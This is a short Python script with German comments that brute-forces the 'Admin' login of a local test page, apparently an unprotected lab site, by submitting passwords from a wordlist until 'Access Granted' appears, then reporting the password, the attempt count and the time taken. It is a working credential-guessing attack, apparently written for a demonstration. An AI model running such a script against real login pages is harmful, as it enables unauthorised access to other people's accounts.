import mechanicalsoup
from time import time

#Author: Patrick Höscheler
#Date: 26.05.2021
#Version: 1.4


browser = mechanicalsoup.StatefulBrowser()

# Öffnen des Browserfensters und Aufrufen der Seite (Seite editierbar)
browser.open('http://localhost:8080/ungeschützt/index.php')

# Das Login-Formular wird ausgewählt
browser.select_form('form#login')
browser["Uname"] = "Admin"
browser["Pass"] = "password"

browser.submit_selected()

# Einbinden der Wortliste
with open("passwordlist/passwordlist.txt") as pw:
    passwordlist = pw.read().replace(',', '').splitlines()


def brute_force():
    cntr = 0
    for password in passwordlist:
        # Zählt Anzahl Versuche
        cntr += 1
        # Formular wird ausgewählt
        browser.select_form('form#login')
        # Username und Passwort werden eingesetzt
        browser["Uname"] = "Admin"
        browser["Pass"] = password
        print(password)
        response = browser.submit_selected()
        if "Access Granted" in response.text:
            print()
            print("Das Passwort ist: " + password)
            print("Anzahl der Versuche: " + str(cntr))
            break
        else:
            # refreshed die Seite nach Fehllogin
            browser.open('http://localhost:8080/ungeschützt/index.php')


start = time()
brute_force()
end = time()
print('Verstrichene Zeit %.2f Sekunden' % (end - start))
